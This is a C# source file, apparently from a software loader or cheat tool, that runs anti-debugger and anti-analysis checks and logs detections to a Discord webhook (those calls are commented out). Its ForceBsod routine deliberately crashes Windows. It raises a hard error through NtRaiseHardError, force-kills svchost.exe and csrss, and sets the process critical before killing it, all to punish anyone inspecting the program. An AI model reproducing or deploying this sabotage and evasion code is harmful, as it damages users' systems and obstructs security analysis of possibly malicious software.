using Utorrent.Forms;
using Utorrent.Misc;
using Protection.Components;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace Protections
{

    class ProtectionComponent
    {

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public static async Task DownloadFile(string dir, string name, string url)
        {
            await Task.Run(delegate
            {
                WebClient webClient = new WebClient();
                using (webClient)
                {
                    webClient.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36");
                    webClient.Headers[HttpRequestHeader.ContentType] = "text/html; charset=UTF-8";
                    webClient.DownloadFile(url, dir + "\\" + name);
                }
            });
        }


        public async static Task AnTdB()
        {

        }



        public async static Task AntiDebuggerCheckout()
        {
            List<string> DebugData = new List<string>();
#if (!DEBUG)
            if (AntiDebugger.GetForegroundWindowAntiDebug()) { DebugData.Add("> Bad Active Debugger Window"); }
            if (AntiDebugger.DebuggerIsAttached()) { DebugData.Add("> Debugger.IsAttached"); }
            if (AntiDebugger.IsDebuggerPresentCheck()) { DebugData.Add("> IsDebuggerPresent"); }
            if (AntiDebugger.NtQueryInformationProcessCheck_ProcessDebugFlags()) { DebugData.Add("> Q.I.P-ProcessDebugFlags"); }
            if (AntiDebugger.NtQueryInformationProcessCheck_ProcessDebugPort()) { DebugData.Add("> Q.I.P-ProcessDebugPort"); }
            if (AntiDebugger.NtQueryInformationProcessCheck_ProcessDebugObjectHandle()) { DebugData.Add("> Q.I.P-ProcessDebugObjectHandle"); }
            if (AntiDebugger.NtCloseAntiDebug_InvalidHandle()) { DebugData.Add("> Invalid Handle"); }
            if (AntiDebugger.NtCloseAntiDebug_ProtectedHandle()) { DebugData.Add("> Protected Handle"); }
            if (AntiDebugger.FindWindowAntiDebug()) { DebugData.Add("> Bad Debugger Windows"); }
            if (AntiDebugger.WebSniffers()) { DebugData.Add("> Http Debugger"); }
#endif

            if (DebugData.Count > 0)
            {
                string DiscordMessageString = "";
                foreach (string item in DebugData)
                {
                    DiscordMessageString += item + Environment.NewLine;
                }

                string debuggerusado = "";
                if (AntiDebugger.pNameData.Count > 0)
                {
                    foreach (string item in AntiDebugger.pNameData)
                    {
                        debuggerusado += item + Environment.NewLine;
                    }
                }

                if (debuggerusado == "")
                {
                    debuggerusado = "> Nao Identificado.";
                }

                await ProtectionComponent.AnTdB();
                senddebugchook(DiscordMessageString, debuggerusado);
                ForceBsod();
                Environment.Exit(0);
            }
        }


        private static void senddebugchook(string chupeta, string chupeta2)
        {
            //try
            //{
            //    string webhookUrl = Loader.KeyAuthApp.var("antidebugger");
            //    SendDiscordWebhook.log(webhookUrl, "**Debugger detectado**\n*Debug detectado:* \n" + chupeta + "\n*Programa detectado:* \n" + chupeta2);

            //}
            //catch
            //{
            //    return;
            //}
        }

        private static void sendnormalhook(string chupeta)
        {
            //try
            //{
            //    string webhookUrl = Loader.KeyAuthApp.var("antidebugger");
            //    SendDiscordWebhook.log(webhookUrl, "**Debugger detectado**\n*Debug detectado:* \n" + chupeta);

            //}
            //catch
            //{
            //    return;
            //}
        }

        public static async Task OthersDetectionsCheckout()
        {
            List<string> OthersItems = new List<string>();
#if (!DEBUG)
            if (AntiOthersDetection.IsUnsignedDriversAllowed()) { OthersItems.Add("> Unsigned Drivers"); }
            if (AntiOthersDetection.IsTestSignedDriversAllowed()) { OthersItems.Add("> Test-Signed Drivers"); }
            if (AntiOthersDetection.IsKernelDebuggingEnabled()) { OthersItems.Add("> Kernel Debugging"); }
#endif

            if (OthersItems.Count > 0)
            {
                string DiscordMessageString = "";
                foreach (string item in OthersItems)
                {
                    DiscordMessageString += item + Environment.NewLine;
                }

                await AnTdB();
                sendnormalhook(DiscordMessageString);
                ForceBsod();
                Environment.Exit(0);
            }
        }

        public static async Task Initializer()
        {
            await ProtectionComponent.AntiDebuggerCheckout();
            await ProtectionComponent.OthersDetectionsCheckout();
        }

        public static void ForceBsod()
        {
            void BSOD()
            {
                bool flag;
                RtlAdjustPrivilege(19, true, false, out flag);
                uint num;
                NtRaiseHardError(3221225506U, 0U, 0U, IntPtr.Zero, 6U, out num);
                void ExecuteCommand(string command)
                {
                    Process process = Process.Start(new ProcessStartInfo("cmd.exe", "/c " + command)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardError = true,
                        RedirectStandardOutput = true
                    });
                    process.WaitForExit();
                    process.StandardOutput.ReadToEnd();
                    process.StandardError.ReadToEnd();
                    int exitCode = process.ExitCode;
                    process.Close();
                }
                ExecuteCommand("taskkill /F /IM svchost.exe /T");
            }


            void BSOD2()
            {
                System.Diagnostics.Process.GetProcessesByName("csrss")[0].Kill();
            }

            void BSOD3()
            {
                System.Diagnostics.Process.EnterDebugMode();
                RtlSetProcessIsCritical(1, 0, 0);
                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }

            void BSOD4()
            {
                int isCritical = 1;
                Process.EnterDebugMode();
                NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
            }

            Native.Reboot();
            try
            {
                BSOD();
            }
            catch { }

            try
            {
                BSOD2();
            }
            catch { }

            try
            {
                BSOD3();
            }
            catch { }

            try
            {
                BSOD4();
            }
            catch { }
        }

    }
}
